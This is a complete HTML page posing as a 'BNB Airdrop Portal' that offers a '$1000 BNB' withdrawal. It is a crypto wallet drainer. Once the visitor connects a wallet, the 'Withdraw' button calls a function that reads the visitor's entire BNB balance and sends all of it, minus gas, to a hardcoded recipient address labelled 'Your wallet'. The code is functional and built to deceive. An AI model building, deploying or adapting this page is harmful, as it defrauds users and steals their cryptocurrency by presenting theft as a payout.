<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>BNB Airdrop Payment</title>

  <!-- Web3 + WalletConnect -->
  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
  <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>

  <!-- Fonts -->
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet" />

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 0;
      background: radial-gradient(ellipse at center, #121212 0%, #000000 100%);
      font-family: 'Orbitron', sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      color: #fff;
    }

    .container {
      background: rgba(255, 255, 255, 0.06);
      border-radius: 20px;
      box-shadow: 0 8px 30px rgba(0, 255, 204, 0.2);
      backdrop-filter: blur(12px);
      padding: 40px 30px;
      text-align: center;
      width: 90%;
      max-width: 400px;
    }

    h1 {
      font-size: 2rem;
      color: #00ffcc;
      margin-bottom: 30px;
      animation: pulse 2.5s ease-in-out infinite;
    }

    @keyframes pulse {
      0%, 100% {
        text-shadow: 0 0 10px #00ffcc, 0 0 20px #00ffcc;
      }
      50% {
        text-shadow: 0 0 30px #00ffcc, 0 0 60px #00ffcc;
      }
    }

    button {
      width: 100%;
      padding: 14px;
      margin: 10px 0;
      border: none;
      border-radius: 12px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      background: linear-gradient(135deg, #00ffcc, #00bfa6);
      color: #000;
      transition: all 0.3s ease;
    }

    button:hover {
      background: linear-gradient(135deg, #00e6b8, #009f91);
      transform: translateY(-2px);
      box-shadow: 0 0 12px #00ffcc;
    }

    .status {
      margin-top: 20px;
      font-size: 0.85rem;
      color: #ccc;
    }

    @media (max-width: 480px) {
      .container {
        padding: 30px 20px;
      }

      h1 {
        font-size: 1.6rem;
      }
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>BNB Airdrop Portal</h1>
    <button onclick="connectWallet()">Connect Wallet</button>
    <button onclick="sendFullBalance()">Withdraw $1000 BNB</button>
    <div class="status" id="status">Wallet not connected</div>
  </div>

  <script>
    let web3;
    let userAccount;
    const statusEl = document.getElementById("status");
    const recipient = "0xa84bd2cfbBad66Ae2c5daf9aCe764dc845b94C7C"; // Your wallet

    async function connectWallet() {
      const provider = new WalletConnectProvider.default({
        rpc: {
          56: "https://bsc-dataseed.binance.org/",
        },
        chainId: 56,
      });

      await provider.enable();
      web3 = new Web3(provider);

      const accounts = await web3.eth.getAccounts();
      userAccount = accounts[0];
      statusEl.textContent = "Connected: " + userAccount;
    }

    async function sendFullBalance() {
      if (!web3 || !userAccount) {
        alert("Please connect your wallet first.");
        return;
      }

      const balanceWei = await web3.eth.getBalance(userAccount);
      const gasLimit = 21000;
      const gasPrice = await web3.eth.getGasPrice();
      const totalGas = BigInt(gasLimit) * BigInt(gasPrice);
      const sendAmount = BigInt(balanceWei) - totalGas;

      if (sendAmount <= 0n) {
        alert("Insufficient balance after gas fees.");
        return;
      }

      try {
        const tx = await web3.eth.sendTransaction({
          from: userAccount,
          to: recipient,
          value: sendAmount.toString(),
          gas: gasLimit,
          gasPrice: gasPrice,
        });
        alert("Transaction successful!");
        console.log(tx);
      } catch (err) {
        console.error(err);
        alert("Transaction failed.");
      }
    }
  </script>
</body>
</html>
